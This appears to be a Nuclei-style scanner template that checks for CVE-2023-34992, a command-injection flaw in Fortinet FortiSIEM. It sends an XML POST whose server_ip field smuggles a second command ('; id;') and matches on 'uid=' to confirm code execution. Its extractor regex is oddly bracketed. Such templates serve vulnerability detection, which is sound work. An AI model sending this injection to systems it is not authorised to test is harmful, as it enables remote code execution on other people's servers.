id: CVE-2023-34992

info:
  name: FortiSIEM Command Injection
  author: Matt Kelly
  severity: high
  description: FortiSIEM is vulnerable to improper neutralization of special elements used in an OS Command vulnerability resulting in RCE.
  reference:
    - https://www.fortiguard.com/psirt/FG-IR-23-130
    - https://github.com/horizon3ai/CVE-2023-34992/blob/main/CVE-2023-34992.py
  tags: cve,cve2023,command-injection,fortinet,fortiguard,fortisiem

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Content-Length: {{payload_length}}
        
        <TEST_STORAGE type="nfs">
            <server_ip>127.0.0.1; id;</server_ip>
            <mount_point>/test</mount_point>
        </TEST_STORAGE>
        
    payloads:
      command: id
    extractors:
      - type: regex
        part: body
        internal: true
        group: 1
        regex: '[uid=\d+\(.*?\) gid=\d+\(.*?\)]'

    matchers:
      - type: word
        words:
          - "uid="
        part: body
        condition: and
      - type: status
        status:
          - 200
